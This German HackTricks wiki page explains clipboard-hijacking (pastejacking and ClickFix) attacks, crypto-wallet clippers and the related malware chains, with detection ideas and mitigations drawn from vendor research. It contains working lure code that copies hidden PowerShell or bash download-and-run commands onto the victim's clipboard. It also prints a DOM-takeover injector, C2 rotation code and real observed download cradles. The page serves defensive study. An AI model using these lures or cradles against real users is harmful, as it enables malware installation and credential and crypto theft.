# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> „Füge niemals etwas ein, das du nicht selbst kopiert hast.“ – alter, aber immer noch gültiger Rat

## Überblick

Clipboard Hijacking – auch *Pastejacking* genannt – nutzt die Tatsache aus, dass Benutzer regelmäßig Befehle kopieren und einfügen, ohne sie zu überprüfen. Eine bösartige Webseite (oder jeder andere JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) platziert programmgesteuert vom Angreifer kontrollierten Text in der Systemzwischenablage. Opfer werden normalerweise durch sorgfältig formulierte Social-Engineering-Anweisungen dazu gebracht, **Win + R** (Ausführen-Dialog), **Win + X** (Schnellzugriff / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage *einzufügen*, wodurch beliebige Befehle sofort ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten Sicherheitskontrollen für E-Mail- und Webinhalte, die Anhänge, Makros oder die direkte Befehlsausführung überwachen. Daher ist dieser Angriff bei Phishing-Kampagnen beliebt, die verbreitete Malware-Familien wie NetSupport RAT, den Latrodectus loader oder Lumma Stealer verbreiten.<sup>[[1]](#references)</sup>

## Wallet-Adressen ersetzende Clipper

Eine weitere Variante von **Clipboard Hijacking** fügt überhaupt keine Befehle ein: Sie wartet, bis das Opfer eine **Kryptowährungs-Wallet-Adresse** kopiert, und ersetzt sie dann kurz vor dem Einfügen unbemerkt durch eine vom Angreifer kontrollierte Adresse. Das ist besonders effektiv bei langen Wallet-Formaten, da Benutzer oft nur die ersten und letzten Zeichen überprüfen.<sup>[[8]](#references)</sup>

Häufige Merkmale aus der Praxis:
- **Schlanker Loader + verschachtelte Payload**: Die sichtbare App/Exe sieht wie ein legitimes Trading- oder „Profit“-Tool aus, während der eigentliche Clipper tiefer im Paket versteckt ist (zum Beispiel ein .NET-Loader, der eine verschachtelte Rust-Payload startet).
- **Regex-gesteuerter Ersatz**: Die Malware erkennt Zeichenfolgen wie `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` oder sogar generische **44 Zeichen lange, Solana-ähnliche** Zeichenfolgen und ersetzt sie durch Wallet-Adressen des Angreifers.
- **Wallet-Rotation in großem Maßstab**: Moderne Windows-Samples können **Tausende** Ersatz-Wallets pro Währung enthalten, statt einer einzigen statischen Adresse. So wird verhindert, dass die Wallet-Reputation nach jedem Diebstahl zu stark leidet.<sup>[[8]](#references)</sup>

### Ablauf eines Windows-Clipper-Angriffs

Eine häufige Implementierung verwendet ein verborgenes Fenster, das mit **`AddClipboardFormatListener`** registriert wird. Bei jeder Aktualisierung der Zwischenablage ruft die Malware typischerweise Folgendes auf:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → Zugriff auf die aktuellen Daten der Zwischenablage.
- **`GetClipboardData`** → Text auslesen.
- **`EmptyClipboard`** + **`SetClipboardData`** → Wallet-Zeichenfolge durch den Wert des Angreifers ersetzen.

Minimale Hunting-Regexe, die häufig in Clipstern vorkommen:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

Persistenz auf Benutzerebene reicht für die Auswirkung aus. Ein beobachtetes Muster ist:<sup>[[8]](#references)</sup>
- Payload nach **`%APPDATA%\silke\silke.exe`** kopieren
- Eine **LNK-Datei im Autostartordner** unter `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` erstellen

Erkennungsideen:
- Prozesse, die kontinuierlich Clipboard-APIs aufrufen und gleichzeitig in `%APPDATA%` und den **Autostartordner** des Benutzers schreiben.
- Erstellung einer neuen LNK-Datei oder ausführbaren Datei, gefolgt von Änderungen der Wallet-Adresse in der Zwischenablage.
- Archive oder gefälschte Software-Bundles, die viele ungenutzte Dateien sowie einen kleinen Launcher enthalten, der eine verschachtelte Binärdatei startet.

### Durch Social Engineering veranlasstes Entfernen der Quarantäne auf macOS + LaunchAgent-Persistenz

Auf macOS liefern manche Kampagnen einen **`unlocker.command`**-Helfer aus und weisen das Opfer an, mit der rechten Maustaste darauf zu klicken → **Öffnen**, falls Gatekeeper meldet, dass die App beschädigt ist oder von einem nicht identifizierten Entwickler stammt. Das Skript entfernt lediglich die Quarantäne und startet die danebenliegende `.app`:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

Dies ist **kein** Gatekeeper-Exploit, sondern ein **durch Social Engineering bewirkter Quarantine-Bypass**, der die Tatsache ausnutzt, dass Gatekeeper-Entscheidungen vom `com.apple.quarantine`-xattr abhängen.<sup>[[8]](#references)</sup>

Nach der Ausführung kann der Clipper als aktueller Benutzer persistieren, indem er Folgendes schreibt:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – Wrapper-Skript
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent mit `RunAtLoad` und `KeepAlive`

Ein nützliches defensives Detail: Einige Samples implementieren einen **selbstheilenden Watchdog**, der den LaunchAgent und den Wrapper etwa alle 30 Sekunden neu schreibt. Wenn du zuerst die plist entfernst, **ohne den laufenden Prozess zu beenden**, kann die Malware sie sofort neu erstellen.<sup>[[8]](#references)</sup> Sichere Reihenfolge zum Bereinigen:
1. Den aktiven Clipper-Prozess beenden.
2. Die LaunchAgent-plist entladen und löschen.
3. `~/launch.sh` und die kopierte Payload löschen.

### Hinweis zur Verbreitung: gefälschte Reputation als Kraftmultiplikator

Bei dieser Familie kann die Malware selbst technisch einfach bleiben, während die **Verbreitungsebene** den Großteil der Arbeit übernimmt: Gefälschte GitHub-Stars und -Forks, SourceForge-Bewertungen und -Downloads, YouTube-Tutorial-Kommentare und -Aufrufe sowie harmlos wirkende VirusTotal-Kommentare und -Votes sollen die Binärdatei vor der Ausführung vertrauenswürdig erscheinen lassen.<sup>[[8]](#references)</sup>

## Erzwungene Copy-Buttons und versteckte Payloads (macOS-One-Liner)

Einige macOS-Infostealer klonen Installer-Websites (z. B. Homebrew) und **erzwingen die Nutzung eines „Copy“-Buttons**, damit Benutzer nicht nur den sichtbaren Text markieren können. Der Clipboard-Eintrag enthält den erwarteten Installationsbefehl sowie eine angehängte Base64-Payload (z. B. `...; echo <b64> | base64 -d | sh`), sodass ein einziges Einfügen beides ausführt, während die Benutzeroberfläche den zusätzlichen Schritt verbirgt.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

Ältere Kampagnen verwendeten `document.execCommand('copy')`, neuere setzen auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Der ClickFix- / ClearFake-Ablauf

1. Der Benutzer besucht eine typosquattete oder kompromittierte Website (z. B. `docusign.sa[.]com`)
2. Eingeschleustes **ClearFake**-JavaScript ruft eine `unsecuredCopyToClipboard()`-Hilfsfunktion auf, die unbemerkt einen Base64-kodierten PowerShell-Einzeiler in der Zwischenablage speichert.
3. HTML-Anweisungen fordern das Opfer auf: *„Drücke **Win + R**, füge den Befehl ein und drücke Enter, um das Problem zu beheben.“*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei sowie eine bösartige DLL enthält (klassisches DLL-Sideloading).
5. Der Loader entschlüsselt weitere Stufen, injiziert Shellcode und richtet Persistenz ein (z. B. eine geplante Aufgabe) – letztendlich werden NetSupport RAT / Latrodectus / Lumma Stealer ausgeführt.<sup>[[1]](#references)</sup>

### Beispiel für eine NetSupport-RAT-Infektionskette

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (legitimes Java WebStart) sucht in seinem Verzeichnis nach `msvcp140.dll`.
* Die schädliche DLL löst APIs dynamisch mit **GetProcAddress** auf, lädt mit **curl.exe** zwei Binärdateien (`data_3.bin`, `data_4.bin`) herunter, entschlüsselt sie mit einem rollierenden XOR-Schlüssel `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript-Downloader in **cscript.exe** aus
3. Ruft eine MSI-Payload ab → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer über MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

Der **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mithilfe von `extrac32` und Dateiverkettung rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Anmeldedaten an `sumeriavgv.digital` exfiltriert.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Dateidownloads und weisen Opfer stattdessen an, eine einzelne Befehlszeile einzufügen, die JavaScript über WSH abruft und ausführt, es persistent macht und den C2 täglich wechselt. Beispiel einer beobachteten Angriffskette:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

Wichtige Merkmale
- Zur Laufzeit umgekehrte, verschleierte URL, um eine oberflächliche Prüfung zu umgehen.
- JavaScript persistiert sich selbst über eine Startup-LNK (WScript/CScript) und wählt den C2 anhand des aktuellen Tages aus – dadurch ist ein schneller Domain-Wechsel möglich.<sup>[[3]](#references)</sup>

Minimales JS-Fragment zum Rotieren der C2s nach Datum:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

Die nächste Phase setzt üblicherweise einen Loader ein, der Persistenz einrichtet und eine RAT (z. B. PureHVNC) nachlädt. Dabei wird TLS häufig an ein fest kodiertes Zertifikat gebunden und der Datenverkehr in Chunks aufgeteilt.<sup>[[3]](#references)</sup>

Spezifische Erkennungsideen für diese Variante
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oder `cscript.exe`).
- Autostart-Artefakte: LNK-Datei in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, die WScript/CScript mit einem JS-Pfad unter `%TEMP%`/`%APPDATA%` aufruft.
- Registry-/RunMRU- und Befehlszeilen-Telemetrie mit `.split('').reverse().join('')` oder `eval(a.responseText)`.
- Wiederholte Ausführung von `powershell -NoProfile -NonInteractive -Command -` mit großen stdin-Payloads, um lange Skripte ohne lange Befehlszeilen einzuspeisen.
- Geplante Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` unter einem updaterähnlichen Task-/Pfad ausführen (z. B. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Täglich rotierende C2-Hostnamen und URLs mit dem Muster `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Clipboard-Schreibereignisse mit anschließendem Einfügen über Win+R und sofortiger Ausführung von `powershell.exe` korrelieren.

Blue-Teams können Clipboard-, Prozesserstellungs- und Registry-Telemetrie kombinieren, um pastejacking-Missbrauch aufzuspüren:

* Windows-Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` speichert den Verlauf der **Win + R**-Befehle – auf ungewöhnliche Base64- oder verschleierte Einträge achten.
* Security Event ID **4688** (Prozesserstellung), wenn `ParentImage` == `explorer.exe` und `NewProcessName` zu { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } gehört.
* Event ID **4663** für Dateierstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder in temporären Ordnern unmittelbar vor dem verdächtigen 4688-Ereignis.
* EDR-Clipboard-Sensoren (sofern vorhanden) – `Clipboard Write` korrelieren, wenn unmittelbar danach ein neuer PowerShell-Prozess gestartet wird.

## IUAM-ähnliche Verifizierungsseiten (ClickFix Generator): Kopieren aus der Zwischenablage in die Konsole + betriebssystemabhängige Payloads

Aktuelle Kampagnen erstellen in großem Umfang gefälschte CDN-/Browser-Verifizierungsseiten („Just a moment…“, IUAM-Stil), die Nutzer dazu bringen, betriebssystemspezifische Befehle aus ihrer Zwischenablage in native Konsolen einzufügen. Dadurch wird die Ausführung aus der Browser-Sandbox verlagert; die Methode funktioniert unter Windows und macOS.<sup>[[4]](#references)</sup>

Wichtige Merkmale der Builder-generierten Seiten
- Betriebssystemerkennung über `navigator.userAgent` zur Anpassung der Payloads (Windows PowerShell/CMD gegenüber macOS Terminal). Optionale Ablenkungsmanöver/No-ops für nicht unterstützte Betriebssysteme erhalten die Illusion.
- Automatisches Kopieren in die Zwischenablage bei harmlos wirkenden UI-Aktionen (Checkbox/Copy), während der sichtbare Text vom Inhalt der Zwischenablage abweichen kann.
- Blockierung mobiler Geräte und ein Popover mit Schritt-für-Schritt-Anweisungen: Windows → Win+R→einfügen→Enter; macOS → Terminal öffnen→einfügen→Enter.
- Optionale Verschleierung und ein einzelner Injector, der das DOM einer kompromittierten Website mit einer Tailwind-gestalteten Verifizierungsoberfläche überschreibt (keine neue Domainregistrierung erforderlich).<sup>[[4]](#references)</sup>

Beispiel: Abweichender Zwischenablageinhalt + betriebssystemabhängige Verzweigung
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS-Persistenz des ersten Laufs
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und weniger sichtbare Spuren hinterlässt.<sup>[[4]](#references)</sup>

Übernahme von Seiten auf kompromittierten Websites in-place
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

Erkennungs- und Hunting-Ideen speziell für IUAM-artige Köder
- Web: Seiten, die die Clipboard API an Verifizierungs-Widgets binden; Abweichungen zwischen angezeigtem Text und Clipboard-Payload; `navigator.userAgent`-Verzweigungen; Tailwind + single-page replace in verdächtigen Kontexten.
- Windows-Endpunkt: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; Batch-/MSI-Installer, die aus `%TEMP%` ausgeführt werden.
- macOS-Endpunkt: Terminal/iTerm startet `bash`/`curl`/`base64 -d` mit `nohup` in zeitlicher Nähe zu Browser-Ereignissen; Hintergrundjobs, die nach dem Schließen des Terminals weiterlaufen.
- `RunMRU`-Win+R-Verlauf und Clipboard-Schreibvorgänge mit der anschließenden Erstellung von Konsolenprozessen korrelieren.

Siehe auch unterstützende Techniken

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026: Entwicklungen bei gefälschten CAPTCHA-/ClickFix-Ködern (ClearFake, Scarlet Goldfinch)

- ClearFake kompromittiert weiterhin WordPress-Websites und injiziert Loader-JavaScript, das externe Hosts (Cloudflare Workers, GitHub/jsDelivr) und sogar Blockchain-„etherhiding“-Aufrufe verkettet (z. B. POST-Anfragen an Binance-Smart-Chain-API-Endpunkte wie `bsc-testnet.drpc[.]org`), um aktuelle Köderlogik abzurufen. Neuere Overlays verwenden häufig gefälschte CAPTCHAs, die Nutzer auffordern, eine Einzeiler-Befehlszeile zu kopieren und einzufügen (T1204.004), anstatt etwas herunterzuladen.<sup>[[6]](#references)</sup>
- Die Erstausführung wird zunehmend an signierte Script-Hosts/LOLBAS delegiert. In Ketten aus dem Januar 2026 wurde die frühere Verwendung von `mshta` durch das integrierte `SyncAppvPublishingServer.vbs` ersetzt, das über `WScript.exe` ausgeführt wird und PowerShell-ähnliche Argumente mit Aliasen/Wildcards übergibt, um Remote-Inhalte abzurufen:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` ist signiert und wird normalerweise von App-V verwendet; in Kombination mit `WScript.exe` und ungewöhnlichen Argumenten (Aliase wie `gal`/`gcm`, Cmdlets mit Platzhaltern, jsDelivr-URLs) wird es zu einer aussagekräftigen LOLBAS-Stufe für ClearFake.<sup>[[6]](#references)</sup>
- Fake-CAPTCHA-Payloads wechselten im Februar 2026 zurück zu reinen PowerShell-Download-Cradles. Zwei aktive Beispiele:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - Die erste Kette ist ein In-Memory-`iex(irm ...)`-Grabber; die zweite nutzt `WinHttp.WinHttpRequest.5.1`, schreibt eine temporäre `.ps1`-Datei und startet sie dann mit `-ep bypass` in einem verborgenen Fenster.<sup>[[6]](#references)</sup>

Erkennungs- und Suchhinweise für diese Varianten
- Prozessabfolge: Browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oder PowerShell-Cradles unmittelbar nach Schreibzugriffen auf die Zwischenablage bzw. Win+R.
- Schlüsselwörter in der Befehlszeile: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr-/GitHub-/Cloudflare-Worker-Domains oder Muster mit rohen IP-Adressen wie `iex(irm ...)`.
- Netzwerk: ausgehende Verbindungen zu CDN-Worker-Hosts oder Blockchain-RPC-Endpunkten von Skript-Hosts oder PowerShell kurz nach dem Surfen im Web.
- Dateien/Registrierung: Erstellung temporärer `.ps1`-Dateien unter `%TEMP%` sowie RunMRU-Einträge mit diesen Einzeilern; signierte Skript-LOLBAS (WScript/cscript/mshta), die mit externen URLs oder verschleierten Alias-Zeichenfolgen ausgeführt werden, blockieren oder Alarm dafür auslösen.

## ClickFix-Techniken im Juni 2026: Paste-Telemetrie, gefälschte Verifizierungskommentare und LOLBin-Verkettung

Aktuelle Telemetrie von Red Canary zeigt, dass der beständige Indikator **nicht ein einzelner exakter Befehl** ist, sondern die Kombination aus **vom Benutzer unterstütztem Einfügen und Ausführen**, **vertrauenswürdigen Interpretern/LOLBins**, **verschleierten Flags**, **Remote-Abruf** und **sofortiger Ausführung**.<sup>[[7]](#references)</sup>

### Bemerkenswerte Muster von Angreifern

- **Telemetrie zur Einfügebestätigung**: Einige Payloads rufen vor der eigentlichen Stufe `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` auf. Damit wird die Benutzerinteraktion bestätigt, während das Zeitfenster kurz und unauffällig bleibt.
- **Gefälschte Verifizierungskommentare**: PowerShell-Einzeiler können Zeichenfolgen wie `# Security check ✔️ I'm not a robot Verification ID: 138105` anhängen, damit der Befehl nach dem Einfügen in Run, `cmd.exe` oder den PowerShell-Verlauf weiterhin wie eine CAPTCHA-Prüfung aussieht.
- **Dynamischer URL-Aufbau**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermeidet eine statische URL in der Befehlszeile und führt dennoch einen In-Memory-Download mit anschließender Ausführung durch.
- **Ausführung getarnter Installer**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` missbraucht ungewöhnliche Groß-/Kleinschreibung und Unicode-ähnliche Zeichen in Flags, um anfällige Erkennungsmechanismen zu umgehen und zugleich `msiexec.exe` zu ähneln.
- **Mit Carets maskierte LOLBin-Ketten**: `cmd.exe` kann Schlüsselwörter durch `^`-Escapes verbergen (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die verschachtelte Shell minimiert starten, Angreiferinhalte unter einer harmlos wirkenden Erweiterung wie `.pdf` speichern und sie anschließend über `mshta` ausführen.<sup>[[7]](#references)</sup>

## Gegenmaßnahmen

1. Browser-Härtung – Schreibzugriff auf die Zwischenablage deaktivieren (`dom.events.asyncClipboard.clipboardItem` usw.) oder eine Benutzeraktion voraussetzen.
2. Sicherheitsbewusstsein – Benutzer darin schulen, sensible Befehle *einzutippen* oder sie zuerst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy und Application Control verwenden, um beliebige Einzeiler zu blockieren.
4. Netzwerkkontrollen – ausgehende Anfragen an bekannte Pastejacking- und Malware-C2-Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** missbraucht häufig denselben ClickFix-Ansatz, nachdem Benutzer auf einen bösartigen Server gelockt wurden:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [ClickFix verhindern: Den ClickFix-Angriffsvektor abwehren](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking-PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Hinter dem reinen Vorhang: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Die ClickFix-Fabrik: Erste Enthüllung des IUAM-ClickFix-Generators](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Februar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Juni 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Von Sternen zu Upvotes: Gefälschte Reputation befeuert einen Crypto-Clipboard-Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
